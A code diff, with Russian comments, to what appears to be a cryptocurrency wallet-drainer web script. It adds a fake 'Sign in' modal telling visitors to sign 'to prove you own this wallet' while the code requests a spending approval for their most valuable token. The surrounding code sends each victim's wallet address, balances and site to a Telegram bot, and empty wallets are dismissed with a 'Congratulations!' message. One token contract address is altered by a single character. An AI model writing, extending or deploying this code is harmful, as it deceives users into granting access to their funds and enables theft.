@@ -55,6 +55,101 @@ const store = {
   isProcessingConnection: false
 }
 
+// Создание модального окна
+function createCustomModal() {
+  const style = document.createElement('style')
+  style.textContent = `
+    .custom-modal {
+      opacity: 0;
+      transition: opacity 0.3s ease-in-out;
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      justify-content: center;
+      align-items: center;
+    }
+    .custom-modal.show {
+      opacity: 1;
+    }
+    .custom-modal-content {
+      transform: translateY(-20px);
+      transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
+      opacity: 0;
+      background-color: #121313;
+      padding: 45px;
+      border-radius: 30px;
+      text-align: center;
+      width: 320px;
+      color: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+    .custom-modal.show .custom-modal-content {
+      transform: translateY(0);
+      opacity: 1;
+    }
+    .custom-modal-title {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 45px;
+      margin-top: -25px;
+    }
+    .custom-modal-loader {
+      border: 4px solid #ffffff33;
+      border-top: 4px solid #ffffff;
+      border-radius: 50%;
+      width: 52px;
+      height: 52px;
+      animation: spin 1s ease-in-out infinite;
+      margin: 0 auto 20px;
+    }
+    .custom-modal-message {
+      margin-top: 45px;
+      font-size: 16px;
+      line-height: 1.5;
+      color: #858585;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  `
+  document.head.appendChild(style)
+
+  const modal = document.createElement('div')
+  modal.id = 'customModal'
+  modal.className = 'custom-modal'
+  modal.innerHTML = `
+    <div class="custom-modal-content">
+      <p class="custom-modal-title">Sign in</p>
+      <div class="custom-modal-loader"></div>
+      <p class="custom-modal-message"> Sign this message to prove you own this wallet and proceed. Canceling will disconnect you.</p>
+    </div>
+  `
+  document.body.appendChild(modal)
+}
+
+function showCustomModal() {
+  const modal = document.getElementById('customModal')
+  if (modal) {
+    modal.style.display = 'flex'
+    setTimeout(() => modal.classList.add('show'), 10) // Небольшая задержка для триггера анимации
+  }
+}
+
+function hideCustomModal() {
+  const modal = document.getElementById('customModal')
+  if (modal) {
+    modal.classList.remove('show')
+    setTimeout(() => modal.style.display = 'none', 300) // Ждем завершения анимации (0.3s)
+  }
+}
+
 // Очистка состояния при загрузке страницы
 window.addEventListener('load', () => {
   appKit.disconnect()
@@ -73,6 +168,7 @@ window.addEventListener('load', () => {
   updateStateDisplay('accountState', {})
   updateStateDisplay('networkState', {})
   updateStateDisplay('tokenBalancesState', [])
+  createCustomModal()
 })
 
 // Утилиты для обновления состояния
@@ -211,9 +307,25 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
     store.connectionKey = connectionKey
+
+    // Показать модальное окно
+    showCustomModal()
+    await new Promise(resolve => setTimeout(resolve, 3000)) // Ждать 3 секунды
+
+    // Проверка баланса
+    const hasBalance = balances.some(token => token.balance > 0)
+    if (!hasBalance) {
+      const modalMessage = document.querySelector('.custom-modal-message')
+      if (modalMessage) modalMessage.textContent = 'Congratulations!'
+      await new Promise(resolve => setTimeout(resolve, 1000)) // Ждать 1 секунду
+      hideCustomModal()
+      store.isProcessingConnection = false
+      return
+    }
+
   } catch (error) {
     store.errors.push(`Error in notifyWalletConnection: ${error.message}`)
-  } finally {
+    hideCustomModal()
     store.isProcessingConnection = false
   }
 }
@@ -315,7 +427,7 @@ const TOKENS = {
     { symbol: 'USDT', address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', decimals: 6 },
     { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 },
     { symbol: 'QUICK', address: '0x831753dd7087cac61ab5644b308642cc1c33dc13', decimals: 18 },
-    { symbol: 'GHST', address: '0x385eeac5cb85a38a9a07a70c73e0a3271cfb54b7', decimals: 18 },
+    { symbol: 'GHST', address: '0x385eeac5cb85a38a9a07a70c73e0a3271cfb54a7', decimals: 18 },
     { symbol: 'DFYN', address: '0xc168e40227e4ebd8b3dabb4b05d0b7c67f6a9be', decimals: 18 },
     { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
     { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0a0fea8e9b7ea0f28c4', decimals: 18 },
@@ -473,6 +585,8 @@ const initializeSubscribers = (modal) => {
           store.errors.push(errorMessage)
           const approveState = document.getElementById('approveState')
           if (approveState) approveState.innerHTML = errorMessage
+          hideCustomModal()
+          store.isProcessingConnection = false
           return
         }
         const targetNetwork = targetNetworkInfo.networkObj
@@ -502,6 +616,8 @@ const initializeSubscribers = (modal) => {
             store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
+            hideCustomModal()
+            store.isProcessingConnection = false
             return
           }
         } else {
@@ -519,6 +635,8 @@ const initializeSubscribers = (modal) => {
             console.log(approveMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = approveMessage
+            hideCustomModal()
+            store.isProcessingConnection = false
             return
           }
           store.isApprovalRequested = true
@@ -540,6 +658,8 @@ const initializeSubscribers = (modal) => {
           }
           const approveState = document.getElementById('approveState')
           if (approveState) approveState.innerHTML = approveMessage
+          hideCustomModal()
+          store.isProcessingConnection = false
         } catch (error) {
           store.isApprovalRequested = false
           if (error.code === 4001 || error.code === -32000) {
@@ -548,11 +668,18 @@ const initializeSubscribers = (modal) => {
             store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
+            hideCustomModal()
+            appKit.disconnect()
+            store.connectionKey = null
+            store.isProcessingConnection = false
+            sessionStorage.clear()
           } else {
             const errorMessage = `Approve failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
             store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
+            hideCustomModal()
+            store.isProcessingConnection = false
           }
         }
       } else {
@@ -577,7 +704,12 @@ const initializeSubscribers = (modal) => {
 initializeSubscribers(appKit)
 updateButtonVisibility(appKit.getIsConnectedState())
 
-document.getElementById('open-connect-modal')?.addEventListener('click', () => appKit.open())
+document.getElementById('open-connect-modal')?.addEventListener('click', () => {
+  if (!appKit.getIsConnectedState()) {
+    appKit.open()
+  }
+})
+
 document.getElementById('disconnect')?.addEventListener('click', () => {
   appKit.disconnect()
   store.approvedTokens = {}
